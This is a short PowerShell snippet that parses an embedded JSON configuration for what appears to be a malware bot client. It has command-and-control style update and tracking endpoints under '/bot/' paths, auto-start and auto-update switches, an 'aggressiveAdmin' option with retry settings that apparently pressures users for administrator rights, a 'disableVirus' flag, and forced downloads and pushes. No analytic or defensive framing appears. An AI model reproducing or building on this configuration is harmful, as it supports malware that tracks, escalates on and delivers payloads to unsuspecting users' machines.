
$server = @'
{
  "version": "2026.04.19 16:26:54",
  "urlDoc": "",
  "disabled": false,
  "disableVirus": false,
  "serverIp": "26.188.115.1",
  "server": "default",
  "extraUpdate": false,
  "updateUrl": "http://123/bot/update",
  "track": true,
  "trackDesktop": false,
  "trackUrl": "http://123/bot/upsert",
  "autoStart": true,
  "autoUpdate": true,
  "aggressiveAdmin": true,
  "aggressiveAdminDelay": 30,
  "aggressiveAdminAttempts": 0,
  "aggressiveAdminTimes": 0,
  "pushesForce": true,
  "pushes": [],
  "startDownloadsForce": true,
  "startDownloads": [],
  "startUrlsForce": false,
  "startUrls": [],
  "frontForce": false,
  "front": [],
  "embeddingsForce": false,
  "embeddings": []
}
'@ | ConvertFrom-Json
